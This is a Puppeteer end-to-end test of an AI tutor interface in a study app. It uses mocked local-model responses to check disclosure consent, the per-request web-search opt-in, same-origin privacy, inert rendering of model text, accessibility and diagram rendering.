import assert from "node:assert/strict";
import { mkdtemp, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import puppeteer from "puppeteer-core";

import { AI_REQUEST_CONTRACT_ID } from "../src/lib/aiContract.js";
import { createMistake } from "../src/lib/mistakes.js";
import { createReviewItem } from "../src/lib/review.js";
import contentIndex from "../src/generated/content-index.json" with { type: "json" };

const baseUrl = process.env.LUMEN_URL || "http://127.0.0.1:4173/";
const chromePath = process.env.CHROME_PATH || "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome";
const profileDirectory = await mkdtemp(join(tmpdir(), "lumen-ai-ui-profile-"));
const runtimeErrors = [];
let browser;

const supportedTasks = [
  "tutor",
  "explain",
  "socratic",
  "quiz",
  "flashcards",
  "interview",
  "summarize",
  "study_plan",
  "answer_feedback",
  "code_review",
];

const secureConfig = Object.freeze({
  ok: true,
  enabled: true,
  requestContract: AI_REQUEST_CONTRACT_ID,
  provider: "ollama-local",
  model: "audit-local-model",
  unavailableReason: null,
  endpoint: "/api/ai/respond",
  streamEndpoint: "/api/ai/respond/stream",
  streamProtocol: "lumen.ai.ndjson.v1",
  service: { configured: true, reachable: true, modelInstalled: true, modelIdentityRequired: true, modelIdentityVerified: true, completionCapable: true, toolCallingCapable: true, thinkingCapable: true, checkedAt: new Date().toISOString() },
  webSearch: {
    configured: true,
    reachable: true,
    available: true,
    macToolAvailable: true,
    requiresPerRequestOptIn: true,
    tool: "search_web",
    endpoint: "/api/local-search",
    maxResults: 5,
    maxRounds: 2,
  },
  supportedTasks,
  structuredTasks: ["quiz", "flashcards", "study_plan", "answer_feedback"],
  responseProfiles: {
    default: "balanced",
    allowed: ["fast", "balanced", "deep"],
    outputTokens: { fast: 1_200, balanced: 3_000, deep: 4_096 },
    maxRequestUtf8Bytes: { fast: 10_000, balanced: 8_740, deep: 7_000 },
    deepUsesPrivateModelThinkingWhenSupported: true,
    providerThinkingReturned: false,
  },
  limits: {
    maxInputChars: 24_000,
    maxRequestUtf8Bytes: 8_740,
    maxOutputTokens: 4_096,
    requestTimeoutMs: 55_000,
    clientTimeoutMs: 70_000,
  },
  privacy: {
    localInference: true,
    paidRemoteApisUsed: false,
    apiKeyRequired: false,
    responseStorage: false,
    applicationServerStorage: false,
    apiKeyExposedToBrowser: false,
    browserCanSelectProviderOrModel: false,
    builtInRemoteToolsEnabled: false,
    webSearchDisabledByDefaultPerRequest: true,
    serviceEndpointsExposedToBrowser: false,
    dataSentWhenRequested: [
      "learner prompt",
      "selected curriculum context",
      "document title",
      "difficulty level",
      "bounded conversation history",
    ],
  },
  usage: {
    tokenCountsReturnedAfterRequest: true,
    costEstimateReturned: false,
  },
});

const quizData = Object.freeze({
  title: "Leakage and evaluation",
  instructions: "Choose the answer that preserves an unbiased final estimate.",
  questions: [{
    id: "leakage-1",
    prompt: "When should the test split influence model selection? [S1]",
    options: [
      "During every hyperparameter trial",
      "Only after model and threshold choices are frozen",
      "Whenever validation performance falls",
    ],
    correctIndex: 1,
    explanation: "The test split is a final untouched estimate of $\\hat{R}(f)$; using it for choices leaks evaluation information into development. [S1]",
    difficulty: "interview",
  }],
});

const flashcardData = Object.freeze({
  cards: [
    { front: "Why must the test split stay untouched? [S1]", back: "Using it for choices leaks evaluation information. [S1]", hint: "Think about selection bias", tags: ["evaluation"] },
    { front: "What does a final holdout estimate?", back: "Generalization after every choice is frozen.", hint: null, tags: [] },
  ],
});

const jsonResponse = (payload, status = 200) => ({
  status,
  contentType: "application/json; charset=utf-8",
  headers: { "Cache-Control": "no-store", "X-Request-Id": "ai-ui-audit" },
  body: JSON.stringify(payload),
});

// Issue #81: whether model text rendered inside `nodes` (the one containing
// `needle`, narrowed to `innerSelector`) is inert. Runs in the page.
function inertReport(nodes, needle, innerSelector) {
  const host = nodes.find((node) => node.textContent.includes(needle));
  if (!host) return null;
  const roots = innerSelector ? [...host.querySelectorAll(innerSelector)] : [host];
  const all = (selector) => roots.flatMap((root) => [...root.querySelectorAll(selector)]);
  return {
    roots: roots.length,
    images: all("img").length,
    controls: all("[data-ai-citation], button:not(.code-copy), input, form, iframe, script").map((node) => node.outerHTML.slice(0, 120)),
    appLinks: all("a[href]").filter((link) => new URL(link.href, location.href).hostname === location.hostname).map((link) => link.getAttribute("href")),
    trackerLinks: all('a[href^="https://tracker.example/"]').map((link) => link.textContent.trim()),
    showsMarkup: roots.some((root) => root.textContent.includes('<button class="ai-tutor__citation"')),
  };
}

const assertInert = (report, where, { trackerLinks }) => {
  assert.ok(report && report.roots > 0, `${where}: the saved AI text was not found`);
  assert.equal(report.images, 0, `${where}: model text rendered an <img>`);
  assert.deepEqual(report.controls, [], `${where}: model text rendered a control`);
  assert.deepEqual(report.appLinks, [], `${where}: model text linked to the app's own host`);
  assert.deepEqual(report.trackerLinks, trackerLinks, `${where}: a remote image was not shown as a link`);
  assert.equal(report.showsMarkup, true, `${where}: model markup was not shown as text`);
};

const clickByText = async (page, selector, text) => {
  const clicked = await page.$$eval(selector, (nodes, expected) => {
    const target = nodes.find((node) => node.textContent.replace(/\s+/g, " ").trim().includes(expected));
    target?.click();
    return Boolean(target);
  }, text);
  assert.ok(clicked, `could not find ${selector} containing “${text}”`);
};

// Depth, response profile, web fallback and privacy live in the Request
// options sheet (issue #57); the question box, Send and the armed-web badge
// stay in the sticky composer.
const openOptions = async (page) => {
  if (await page.$(".tutor-sheet")) return;
  await page.$eval(".ai-tutor__options-toggle", (button) => button.click());
  await page.waitForSelector(".tutor-sheet .ai-tutor__web-search input", { timeout: 5_000 });
};

const closeOptions = async (page) => {
  if (!(await page.$(".tutor-sheet"))) return;
  await page.$eval(".tutor-sheet__done", (button) => button.click());
  await page.waitForSelector(".tutor-sheet", { hidden: true, timeout: 5_000 });
};

const withOptions = async (page, action) => {
  await openOptions(page);
  try {
    return await action();
  } finally {
    await closeOptions(page);
  }
};

// Phones pick the mode from a native select; wider screens show chips.
const chooseMode = async (page, label) => {
  if (await page.$(".ai-tutor__mode-select select")) {
    const value = await page.$$eval(".ai-tutor__mode-select option", (options, text) => options.find((option) => option.textContent.trim() === text)?.value || "", label);
    assert.ok(value, `the mode select has no “${label}” option`);
    await page.select(".ai-tutor__mode-select select", value);
    return;
  }
  await clickByText(page, ".ai-tutor__mode-tabs button", label);
};

const activeMode = (page) => page.evaluate(() => {
  const select = document.querySelector(".ai-tutor__mode-select select");
  return (select ? select.selectedOptions[0]?.textContent : document.querySelector(".ai-tutor__mode-tabs button[aria-pressed='true']")?.textContent)?.trim() || "";
});

// A finished answer is brought into view with a smooth page scroll on
// phones (issue #57); pointer clicks wait until the page has settled.
const settleScroll = (page) => page.evaluate(() => new Promise((resolve) => {
  let last = -1;
  let stable = 0;
  const started = performance.now();
  const check = () => {
    stable = Math.abs(scrollY - last) < 0.5 ? stable + 1 : 0;
    last = scrollY;
    if (stable >= 3 || performance.now() - started > 2_000) resolve();
    else requestAnimationFrame(check);
  };
  requestAnimationFrame(check);
}));

const readProfile = (page) => page.evaluate(() => new Promise((resolve, reject) => {
  const request = indexedDB.open("lumen-ai-notes", 1);
  request.onerror = () => reject(request.error);
  request.onsuccess = () => {
    const transaction = request.result.transaction("study-data", "readonly");
    const get = transaction.objectStore("study-data").get("profile");
    get.onerror = () => reject(get.error);
    get.onsuccess = () => resolve(get.result);
  };
}));

const waitForStoredHistory = (page, predicate) => page.waitForFunction((serializedPredicate) => new Promise((resolve) => {
  const request = indexedDB.open("lumen-ai-notes", 1);
  request.onerror = () => resolve(false);
  request.onsuccess = () => {
    const get = request.result.transaction("study-data", "readonly").objectStore("study-data").get("profile");
    get.onerror = () => resolve(false);
    get.onsuccess = () => {
      const length = get.result?.aiTutorHistory?.length ?? -1;
      if (typeof serializedPredicate === "number") resolve(length >= serializedPredicate);
      else if (serializedPredicate === "nonempty") resolve(length >= 2);
      else resolve(length === 0);
    };
  };
}), { timeout: 8_000 }, predicate);

const attachDiagnostics = (page, label) => {
  page.on("pageerror", (error) => runtimeErrors.push(`${label}: ${error.message}`));
  page.on("console", (message) => {
    if (message.type() === "error" && !message.text().includes("Failed to load resource")) {
      runtimeErrors.push(`${label}: ${message.text()}`);
    }
  });
};

const installAiMocks = async (page, configFactory, { failFirstResponse = false, failFirstResponseCode = "AI_LOCAL_MODEL_ERROR", abortFirstResponse = false, pairResponder = null, responseDelayMs = 0, answerText = null, webSearchUnavailable = false, quiz = quizData, feedback = null, flashcards = flashcardData } = {}) => {
  const calls = { config: [], respond: [], pair: [] };
  await page.setRequestInterception(true);
  page.on("request", (request) => {
    const url = new URL(request.url());
    if (url.pathname === "/api/ai/config") {
      calls.config.push({ method: request.method(), url: request.url(), headers: request.headers() });
      void request.respond(jsonResponse(configFactory()));
      return;
    }
    if (url.pathname === "/api/auth/pair") {
      let body = {};
      try { body = JSON.parse(request.postData() || "{}"); } catch { body = {}; }
      calls.pair.push({ method: request.method(), body });
      const outcome = pairResponder
        ? pairResponder(body)
        : { status: 409, payload: { ok: false, requestId: "audit-pair", error: { code: "AI_AUTH_NOT_ENABLED", message: "This server does not use learner pairing." } } };
      void request.respond(jsonResponse(outcome.payload, outcome.status));
      return;
    }
    if (url.pathname === "/api/ai/respond" || url.pathname === "/api/ai/respond/stream") {
      // A request the page abandoned (for example by leaving the tutor) can
      // no longer be answered; that is expected, not an audit failure.
      const reply = (response) => {
        const respond = () => { request.respond(response).catch(() => {}); };
        if (responseDelayMs) setTimeout(respond, responseDelayMs);
        else respond();
      };
      let body = {};
      try { body = JSON.parse(request.postData() || "{}"); } catch { body = {}; }
      calls.respond.push({ method: request.method(), url: request.url(), headers: request.headers(), body });
      if (abortFirstResponse && calls.respond.length === 1) {
        void request.abort("connectionfailed");
        return;
      }
      if (failFirstResponse && calls.respond.length === 1) {
        reply(jsonResponse({
          ok: false,
          requestId: "audit-retry-failure",
          error: { code: failFirstResponseCode, message: "Temporary local-model failure." },
        }, 503));
        return;
      }
      if (body.task === "flashcards") {
        reply(jsonResponse({
          ok: true,
          requestId: "audit-flashcards-request",
          outputText: JSON.stringify(flashcards),
          data: flashcards,
          status: "completed",
          model: "audit-local-model",
          usage: { inputTokens: 300, outputTokens: 120, totalTokens: 420 },
          webSearch: { requested: false, used: false, rounds: 0 },
          sources: [],
        }));
      } else if (body.task === "answer_feedback") {
        // An answer check: a function of the request, so a scenario can
        // return a valid result or one that breaks the schema.
        const data = typeof feedback === "function" ? feedback(body) : feedback;
        reply(jsonResponse({
          ok: true,
          requestId: "audit-feedback-request",
          outputText: JSON.stringify(data),
          data,
          status: "completed",
          model: "audit-local-model",
          usage: { inputTokens: 300, outputTokens: 160, totalTokens: 460 },
          webSearch: { requested: false, used: false, rounds: 0 },
          sources: [],
        }));
      } else if (body.task === "quiz") {
        reply(jsonResponse({
          ok: true,
          requestId: "audit-quiz-request",
          outputText: JSON.stringify(quiz),
          data: quiz,
          status: "completed",
          model: "audit-local-model",
          usage: { inputTokens: 320, outputTokens: 180, totalTokens: 500 },
          webSearch: { requested: false, used: false, rounds: 0 },
          sources: [],
        }));
      } else {
        const localCitation = body.context.match(/^\[(S\d+)\]/)?.[1] || "S1";
        // The server's library-only degradation: the approved search ran but
        // kept no usable web evidence, so the answer is library-only and
        // opens with the server-written notice (docs/AI_STREAMING.md).
        const webDegraded = webSearchUnavailable && body.webSearch === true;
        const outputText = webDegraded ? `> **Current-web evidence unavailable.** The approved web search returned no usable public results, so this answer uses only your library sources and may not reflect the latest information.\n\nRepeated test inspection causes evaluation leakage. [${localCitation}]` : answerText ? answerText(localCitation, body) : `## Holdout evaluation\n\nA **final holdout** remains useful only when development decisions cannot adapt to it. Repeated test inspection causes evaluation leakage. [${localCitation}]\n\n| Signal | Risk |\n| --- | --- |\n| Repeated inspection | Optimistic estimate |\n\nThe mean loss is $L = \\frac{1}{n}\\sum_i \\ell_i$.\n\n\`\`\`python\nscore = evaluate(frozen_model, holdout)\n\`\`\`\n\n\`\`\`mermaid\nflowchart LR\n  TRAIN[Development decisions] --> HOLDOUT[Final holdout]\n  HOLDOUT --> ESTIMATE[Unbiased estimate]\n\`\`\`\n\nCurrent release evidence is separately cited as [W1].`;
        const sources = body.webSearch && !webDegraded ? [{ title: "PyTorch release notes", url: "https://pytorch.org/blog/releases/#stable", snippet: "Current release evidence." }] : [];
        const approach = { summary: "Ground in the local library, then use approved current evidence where needed.", steps: ["Locate relevant library evidence.", "Attach the approved web result.", "Present a concise answer with citations."] };
        const response = {
          ok: true,
          requestId: "audit-explain-request",
          outputText,
          data: null,
          status: "completed",
          model: "audit-local-model",
          usage: { inputTokens: 240, outputTokens: 46, totalTokens: 286 },
          webSearch: { requested: body.webSearch === true, used: body.webSearch === true && !webDegraded, rounds: body.webSearch ? webDegraded ? 2 : 1 : 0 },
          sources,
          approach,
        };
        if (url.pathname.endsWith("/stream")) {
          const events = [
            { type: "start", protocol: "lumen.ai.ndjson.v1", requestId: response.requestId, model: response.model, responseFormat: "markdown", responseProfile: body.responseProfile, startedAt: new Date().toISOString() },
            { type: "approach", requestId: response.requestId, approach },
            { type: "phase", requestId: response.requestId, phase: "generating", message: "Generating the grounded answer…" },
            ...sources.map((source, index) => ({ type: "source", requestId: response.requestId, index: index + 1, source })),
            { type: "delta", requestId: response.requestId, sequence: 0, text: outputText.slice(0, Math.floor(outputText.length / 2)) },
            { type: "delta", requestId: response.requestId, sequence: 1, text: outputText.slice(Math.floor(outputText.length / 2)) },
            { type: "complete", requestId: response.requestId, response },
          ];
          reply({ status: 200, contentType: "application/x-ndjson", headers: { "Cache-Control": "no-store", "X-Request-Id": response.requestId, "X-Lumen-Stream-Protocol": "lumen.ai.ndjson.v1" }, body: `${events.map((event) => JSON.stringify(event)).join("\n")}\n` });
        } else reply(jsonResponse(response));
      }
      return;
    }
    void request.continue();
  });
  return calls;
};

// An in-page stream that delivers deltas over time, armed per request with
// window.__lumenAuditSlowStream = { paragraphs, phases }. It checks
// following, scrolling back, Stop and Esc without a real model.
const installSlowStream = (page) => page.evaluateOnNewDocument(() => {
  const nativeFetch = window.fetch.bind(window);
  window.fetch = async (input, init = {}) => {
    const url = typeof input === "string" ? input : input.url;
    const slow = window.__lumenAuditSlowStream;
    if (!slow || !url.includes("/api/ai/respond/stream")) return nativeFetch(input, init);
    window.__lumenAuditSlowStream = null;
    const encoder = new TextEncoder();
    const paragraphs = Number.isSafeInteger(slow?.paragraphs) ? slow.paragraphs : 40;
    const text = Array.from({ length: paragraphs }, (_, index) => `Paragraph ${index + 1} explains why a final holdout must stay untouched.\n\n`).join("");
    const approach = { summary: "Stream a long answer.", steps: ["Answer in parts."] };
    const response = { ok: true, requestId: "audit-slow-stream", outputText: text, data: null, status: "completed", model: "audit-local-model", usage: { inputTokens: 10, outputTokens: 400, totalTokens: 410 }, webSearch: { requested: false, used: false, rounds: 0 }, sources: [], approach };
    const stream = new ReadableStream({
      async start(controller) {
        const send = (event) => { try { controller.enqueue(encoder.encode(`${JSON.stringify(event)}\n`)); } catch { /* aborted */ } };
        send({ type: "start", protocol: "lumen.ai.ndjson.v1", requestId: response.requestId, model: response.model, responseFormat: "markdown", responseProfile: "balanced", startedAt: new Date().toISOString() });
        send({ type: "approach", requestId: response.requestId, approach });
        for (const [phase, message] of Array.isArray(slow?.phases) ? slow.phases : []) {
          await new Promise((resolve) => setTimeout(resolve, slow.phaseDelayMs || 400));
          if (init.signal?.aborted) return;
          send({ type: "phase", requestId: response.requestId, phase, message });
        }
        const pieces = text.match(/[\s\S]{1,120}/g);
        for (let index = 0; index < pieces.length; index += 1) {
          await new Promise((resolve) => setTimeout(resolve, 60));
          if (init.signal?.aborted) return;
          send({ type: "delta", requestId: response.requestId, sequence: index, text: pieces[index] });
        }
        send({ type: "complete", requestId: response.requestId, response });
        try { controller.close(); } catch { /* aborted */ }
      },
    });
    return new Response(stream, { status: 200, headers: { "Content-Type": "application/x-ndjson", "X-Request-Id": response.requestId, "X-Lumen-Stream-Protocol": "lumen.ai.ndjson.v1" } });
  };
});

// A page in its own browser context: no conversation, consent, quiz state
// or profile data left by the scenarios before it.
const phoneViewport = { width: 393, height: 852, deviceScaleFactor: 1, isMobile: true, hasTouch: true };
const newIsolatedPage = async (label, { viewport = phoneViewport, acknowledged = true, configFactory = () => secureConfig, mocks = {} } = {}) => {
  const context = await browser.createBrowserContext();
  const page = await context.newPage();
  await page.setViewport(viewport);
  attachDiagnostics(page, label);
  if (acknowledged) {
    await page.evaluateOnNewDocument(() => {
      try { localStorage.setItem("lumen.ai.local-disclosure-ack.v1", "acknowledged"); } catch { /* consent can still be given in the UI */ }
    });
  }
  const calls = await installAiMocks(page, configFactory, mocks);
  return { context, page, calls };
};

// Merges fields into the stored profile; the app reads them on reload.
const patchStoredProfile = (page, patch) => page.evaluate((patchJson) => new Promise((resolve, reject) => {
  const request = indexedDB.open("lumen-ai-notes", 1);
  request.onerror = () => reject(request.error);
  request.onsuccess = () => {
    const transaction = request.result.transaction("study-data", "readwrite");
    const store = transaction.objectStore("study-data");
    const get = store.get("profile");
    get.onerror = () => reject(get.error);
    get.onsuccess = () => { store.put({ ...get.result, ...JSON.parse(patchJson) }, "profile"); };
    transaction.oncomplete = () => resolve();
    transaction.onerror = () => reject(transaction.error);
  };
}), JSON.stringify(patch));

const setComposerPrompt = (page, value) => page.$eval(".ai-tutor__composer textarea", (field, text) => {
  Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype, "value").set.call(field, text);
  field.dispatchEvent(new Event("input", { bubbles: true }));
}, value);

const waitForAnswers = (page, count) => page.waitForFunction((expected) => document.querySelectorAll(".ai-tutor__message--assistant:not(.ai-tutor__message--streaming)").length >= expected
  && !document.querySelector(".ai-tutor__message--streaming"), { timeout: 15_000 }, count);

const newAuditPage = async (label, configFactory, options) => {
  const page = await browser.newPage();
  await page.setViewport({ width: 393, height: 852, deviceScaleFactor: 1, isMobile: true, hasTouch: true });
  attachDiagnostics(page, label);
  const calls = await installAiMocks(page, configFactory, options);
  return { page, calls };
};

try {
  browser = await puppeteer.launch({
    executablePath: chromePath,
    headless: true,
    userDataDir: profileDirectory,
    args: ["--disable-background-networking", "--no-first-run", "--no-default-browser-check"],
  });

  const ready = await newAuditPage("ready", () => secureConfig);
  const { page, calls } = ready;
  page.on("dialog", (dialog) => dialog.accept());
  await page.goto(`${baseUrl}#/ai`, { waitUntil: "networkidle2", timeout: 30_000 });
  await page.waitForSelector(".ai-tutor__connection--ready", { timeout: 10_000 });
  assert.equal(await page.evaluate(() => window.isSecureContext), true, "loopback audit origin was not treated as a secure context");
  assert.match(await page.$eval(".ai-tutor__connection--ready", (node) => node.textContent), /local Ollama model ready/i);
  assert.equal(calls.config.length, 1, "AI configuration was not checked exactly once on initial mount");
  assert.equal(new URL(calls.config[0].url).origin, new URL(baseUrl).origin, "configuration request was not same-origin");
  await page.waitForSelector(".ai-tutor__source.is-selected", { timeout: 10_000 });
  // Until acknowledged, the local-model disclosure is in the composer
  // itself, never only inside the options sheet.
  assert.equal(await page.$eval(".ai-tutor__composer .ai-tutor__consent-card", (node) => node.getBoundingClientRect().height > 0), true, "the unacknowledged disclosure was not shown in the composer");
  // The checkbox above the question is the visible reason; the repeated
  // sentence is not drawn in the dock but still names why Send is off.
  assert.deepEqual(await page.$eval(".ai-tutor__disabled-reason", (node) => ({
    text: /acknowledge the local-model disclosure/.test(node.textContent),
    drawn: node.getBoundingClientRect().height > 1,
    linked: document.querySelector(".ai-tutor__send").getAttribute("aria-describedby").split(" ").includes(node.id),
  })), { text: true, drawn: false, linked: true }, "the disclosure reason was lost, drawn twice or unlinked from Send");
  const optionsFocus = await page.evaluate(() => {
    const opener = document.querySelector(".ai-tutor__options-toggle");
    opener.focus();
    opener.click();
    return { expanded: opener.getAttribute("aria-haspopup") };
  });
  assert.equal(optionsFocus.expanded, "dialog", "the Options button does not announce its dialog");
  await page.waitForSelector(".tutor-sheet[role='dialog'][aria-modal='true']", { timeout: 5_000 });
  assert.equal(await page.evaluate(() => document.activeElement?.classList.contains("tutor-sheet")), true, "opening Options did not move focus into the sheet");
  assert.equal(
    await page.$eval('.ai-tutor__response-profiles input[value="deep"]', (input) => input.disabled),
    false,
    "Deep profile was unavailable although the model attests thinking support",
  );
  assert.equal(await page.$(".ai-tutor__privacy-body"), null, "request details should be collapsed by default");
  await page.click(".ai-tutor__privacy-toggle");
  const disclosure = await page.$eval(".ai-tutor__privacy-body", (node) => node.textContent.replace(/\s+/g, " "));
  assert.match(disclosure, /local Ollama model running on the Lumen server/i);
  assert.match(disclosure, /no paid remote-model API/i);
  assert.match(disclosure, /saves up to 50 normalized tutor messages and web-source links locally/i);
  assert.match(disclosure, /includes them in exported backups/i);
  assert.match(disclosure, /Clear conversation/i);
  assert.match(disclosure, /no paid-provider key is accepted or exposed/i);

  // Web egress is available only after the complete-library sufficiency
  // check. Moving to any narrower source scope must clear and disable it.
  await page.locator(".ai-tutor__web-search input").click();
  // The sheet keeps Tab inside, closes with Escape and returns focus to the
  // Options button; the armed permission stays visible on the composer.
  for (let step = 0; step < 14; step += 1) await page.keyboard.press("Tab");
  assert.equal(await page.evaluate(() => Boolean(document.activeElement?.closest(".tutor-sheet"))), true, "Tab escaped the options sheet");
  await page.keyboard.press("Escape");
  await page.waitForSelector(".tutor-sheet", { hidden: true, timeout: 5_000 });
  assert.equal(await page.evaluate(() => document.activeElement?.classList.contains("ai-tutor__options-toggle")), true, "closing the options sheet did not return focus to Options");
  assert.match(await page.$eval(".ai-tutor__composer .ai-tutor__web-status.is-armed", (node) => node.textContent), /armed for this request/i, "the armed web permission was not visible on the composer");
  await page.click(".ai-tutor__source-panel-toggle");
  await clickByText(page, ".ai-tutor__source-modes button", "No library");
  await withOptions(page, async () => {
    assert.equal(await page.$eval(".ai-tutor__web-search input", (input) => input.checked), false, "leaving Library first did not clear web fallback");
    assert.equal(await page.$eval(".ai-tutor__web-search input", (input) => input.disabled), true, "web fallback remained enabled without whole-library retrieval");
  });
  assert.equal(await page.$(".ai-tutor__composer .ai-tutor__web-status.is-armed"), null, "a withdrawn web permission still showed as armed");
  await clickByText(page, ".ai-tutor__source-modes button", "Library first");
  await withOptions(page, async () => {
    assert.equal(await page.$eval(".ai-tutor__web-search input", (input) => input.disabled), false, "Library first did not restore the eligible web-fallback control");
    const undersizedSheetControls = await page.$$eval(".tutor-sheet button, .tutor-sheet select", (nodes) => nodes
      .map((node) => ({ name: (node.getAttribute("aria-label") || node.textContent || node.tagName).trim().slice(0, 40), height: Math.round(node.getBoundingClientRect().height) }))
      .filter((control) => control.height > 0 && control.height < 44));
    assert.deepEqual(undersizedSheetControls, [], `undersized options-sheet controls on a phone: ${JSON.stringify(undersizedSheetControls)}`);
  });
  // Phone targets (TC-21): every tutor control on this 393px phone is at
  // least 44px tall, the source filter included. Inline citations extend
  // their hit area with a pseudo-element instead.
  await clickByText(page, ".ai-tutor__source-modes button", "Choose sources");
  const undersizedTutorControls = await page.$$eval(".ai-tutor button, .ai-tutor select, .ai-tutor textarea, .ai-tutor__source-tools > label", (nodes) => nodes
    .filter((node) => !node.classList.contains("ai-tutor__citation") && !node.closest(".visually-hidden"))
    .map((node) => ({ name: (node.getAttribute("aria-label") || node.textContent || node.tagName).trim().slice(0, 40), height: Math.round(node.getBoundingClientRect().height) }))
    .filter((control) => control.height > 0 && control.height < 44));
  assert.deepEqual(undersizedTutorControls, [], `undersized Mac tutor controls on a phone: ${JSON.stringify(undersizedTutorControls)}`);
  await clickByText(page, ".ai-tutor__source-modes button", "Library first");

  const sendSelector = ".ai-tutor__send";
  await page.$eval(".ai-tutor__composer textarea", (field) => {
    const setter = Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype, "value").set;
    setter.call(field, "How does Double DQN reduce overestimation bias, and what is the latest implementation guidance?");
    field.dispatchEvent(new Event("input", { bubbles: true }));
  });
  await withOptions(page, async () => {
    assert.equal(await page.$eval(".ai-tutor__web-search input", (input) => input.checked), false, "web search was not off by default");
  });
  assert.equal(await page.$eval(sendSelector, (button) => button.disabled), true, "send was enabled before explicit consent");
  await page.click(".ai-tutor__consent input");
  assert.equal(await page.$eval(sendSelector, (button) => button.disabled), false, "one-time local disclosure acknowledgement did not enable a valid grounded request");
  await withOptions(page, () => page.locator(".ai-tutor__web-search input").click());
  assert.equal(await page.$eval(sendSelector, (button) => button.disabled), false, "the web-fallback checkbox did not act as its own one-request authorization");
  assert.match(await page.$eval(".ai-tutor__web-status.is-armed", (node) => node.textContent), /armed for this request/i);
  await page.$eval(sendSelector, (button) => button.click());
  await page.waitForSelector(".ai-tutor__message--assistant .ai-tutor__citation", { timeout: 10_000 });
  await clickByText(page, ".ai-tutor__message--assistant .ai-tutor__message-actions button", "Sources");
  await page.waitForSelector(".ai-tutor__web-sources a", { timeout: 10_000 });
  assert.equal(calls.respond.length, 1, "plain tutor request was not sent exactly once");
  const plainRequest = calls.respond[0];
  assert.equal(plainRequest.method, "POST");
  assert.equal(new URL(plainRequest.url).origin, new URL(baseUrl).origin, "AI response request was not same-origin");
  assert.equal(plainRequest.headers.authorization, undefined, "browser request exposed an Authorization header");
  assert.equal(plainRequest.body.contract, AI_REQUEST_CONTRACT_ID, "canonical request did not declare the compiled request contract");
  assert.equal(plainRequest.body.task, "explain");
  assert.equal(plainRequest.body.responseFormat, "markdown", "plain response did not send the canonical server-normalized format field");
  assert.equal(plainRequest.body.conversationSummary, "", "plain response did not send the canonical server-normalized summary field");
  assert.equal(plainRequest.body.webSearch, true, "explicit web-search consent was not sent for this request");
  assert.ok(Buffer.byteLength(JSON.stringify(plainRequest.body), "utf8") <= secureConfig.responseProfiles.maxRequestUtf8Bytes.balanced, "submitted plain request exceeded the active-profile payload budget");
  assert.ok(plainRequest.body.context.length <= 12_000, "default Explain request exceeded its retrieved context working set");
  assert.equal(plainRequest.body.responseProfile, "balanced", "default response profile was not balanced");
  assert.equal(plainRequest.body.maxOutputTokens, 3_000, "balanced response did not use the advertised output allowance");
  assert.match(plainRequest.body.context, /^\[S\d+\]/, "whole-library retrieval did not attach a stably labelled passage from an unopened lesson");
  assert.match(plainRequest.body.prompt, /cite every source-grounded claim/i);
  assert.equal(Array.isArray(plainRequest.body.history), true);
  assert.equal(plainRequest.body.history.length, 0, "first request unexpectedly sent conversation history");
  assert.equal(await page.$eval(".ai-tutor__web-sources a", (anchor) => anchor.href), "https://pytorch.org/blog/releases/", "sanitized web evidence link did not render");
  assert.equal(await page.$eval("a.ai-tutor__citation", (anchor) => anchor.href), "https://pytorch.org/blog/releases/", "[W#] inline citation did not resolve to its distinct web source");
  assert.equal((await page.$$(".ai-tutor__response-text table")).length, 1, "GFM table did not render");
  assert.equal((await page.$$(".ai-tutor__response-text .katex")).length > 0, true, "LaTeX did not render through KaTeX");
  assert.equal((await page.$$(".ai-tutor__response-text .code-shell")).length, 1, "fenced code block did not render");
  // Answer headings sit below the tutor h2 and the per-message h3: a model
  // "##" renders as h4 and keeps its visual size through a class.
  assert.deepEqual(await page.$$eval(".ai-tutor__response-text .ai-tutor__md-h2", (nodes) => nodes.map((node) => node.tagName)), ["H4"], "Markdown heading did not render below the message heading");
  assert.equal((await page.$$(".ai-tutor__response-text :is(h1, h2, h3)")).length, 0, "an answer heading escaped the tutor's heading hierarchy");
  await page.waitForSelector('.ai-tutor__message--assistant .diagram-shell[data-diagram-status="rendered"] svg', { timeout: 15_000 }).catch(async (error) => {
    const diagnostic = await page.$eval(".ai-tutor__message--assistant .diagram-shell", (node) => node.closest(".ai-tutor__response-text")?.outerHTML || node.outerHTML).catch(() => "<diagram shell missing>");
    error.message += `\nDiagram DOM: ${diagnostic.slice(0, 2_000)}\nRuntime errors: ${runtimeErrors.join(" | ") || "none"}`;
    throw error;
  });
  assert.equal(await page.$('.ai-tutor__message--assistant .diagram-diagnostic'), null, "valid tutor Mermaid displayed a failure diagnostic");
  await waitForStoredHistory(page, "nonempty");
  await page.evaluate(() => new Promise((resolve) => requestAnimationFrame(() => requestAnimationFrame(resolve))));
  await page.waitForSelector('.ai-tutor__message--assistant .mermaid[data-diagram-status="rendered"] svg');
  const originalDiagramId = await page.$eval(".ai-tutor__message--assistant .mermaid svg", (node) => node.id);
  const originalDiagramTheme = await page.evaluate(() => document.documentElement.dataset.theme);
  const nextDiagramTheme = await page.evaluate(() => getComputedStyle(document.documentElement).colorScheme === "dark" ? "paper" : "dark");
  await page.click('[aria-label="Open settings"]');
  await page.waitForSelector(".settings-drawer");
  assert.equal(await page.$eval(".ai-tutor__message--assistant .mermaid svg", (node) => node.id), originalDiagramId, "opening a dialog unnecessarily cleared the AI diagram");
  await clickByText(page, ".theme-choices button", nextDiagramTheme === "dark" ? "Night" : "Paper");
  await page.waitForFunction((theme) => document.documentElement.dataset.theme === theme, {}, nextDiagramTheme);
  await page.$eval(".settings-close", (button) => button.click());
  // A settings update may replace the response subtree; a per-node counter
  // then restarts at one. The SVG identity proves a new render either way.
  await page.waitForFunction((before) => {
    const svg = document.querySelector('.ai-tutor__message--assistant .mermaid[data-diagram-status="rendered"] svg');
    return svg && svg.id !== before;
  }, { timeout: 15_000 }, originalDiagramId);
  assert.match(await page.$eval(".ai-tutor__message--assistant .mermaid svg", (node) => node.textContent), /Development decisions/iu, "theme rerender used SVG text instead of the preserved Mermaid definition");
  assert.equal(await page.$('.ai-tutor__message--assistant .diagram-diagnostic'), null, "theme change corrupted a valid tutor diagram");
  await page.click('[aria-label="Open settings"]');
  await clickByText(page, ".theme-choices button", { system: "System", paper: "Paper", dark: "Night", contrast: "Contrast" }[originalDiagramTheme]);
  await page.$eval(".settings-close", (button) => button.click());
